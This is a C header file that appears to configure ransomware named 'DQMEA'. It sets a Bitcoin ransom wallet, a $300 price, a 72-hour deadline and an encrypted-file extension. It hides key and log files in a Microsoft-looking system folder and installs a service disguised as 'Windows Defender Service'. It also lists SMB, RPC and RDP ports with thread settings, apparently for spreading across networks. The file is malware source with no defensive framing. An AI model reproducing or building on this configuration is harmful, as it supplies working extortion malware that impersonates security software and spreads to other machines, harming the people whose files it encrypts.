#pragma once 

#define DQMEA_WALLET        L"1Mz7I53HMuxXTuR2R1t78mGSdzaAtNbBWX"
#define DQMEA_PRICE_USD     300
#define DQMEA_TIMER_HOURS   72
#define DQMEA_EXTENTION     L".dqmea"
#define DQMEA_MAGIC         "DQMEA1"

#define DQMEA_DROP_PATH     L"C:\\ProgramData\\Microsoft\\Windows\\SystemCache\\dqmea.dat"
#define DQMEA_VAULT_PATH    L"C:\\ProgramData\\Microsoft\\Windows\\SystemCache\\dqmea.key"
#define DQMEA_LOG_PATH      L"C:\\ProgramData\\Microsoft\\Windows\\SystemCache\\dqmea.log"
#define DQMEA_MUTEX         L"Global//DqmeaMutex_7F3A9B2C"

#define DQMEA_SERVICE_NAME  L"WinDefendSvc"
#define DQMEA_SERVIVE_DISP  L"Windows Defender Service"
#define DQMEA_SERVICE_DESC  L"Provides real time protection for Windows"

#define DQMEA_SMB_TIMEOUT   2000
#define DQMEA_MAX_THREADS   64
#define DQMEA_SCAN_PORTS    {445, 135, 139, 3389}

#define DQMEA_KEY_COUNT     128
#define DQMEA_KEY_GROUPS    10
#define DQMEA_GROUP_LEN     8
#define DQMEA_KEY_LEN       (DQMEA_KEY_GROUPS * DQMEA_GROUP_LEN + DQMEA_KEY_GROUPS - 1)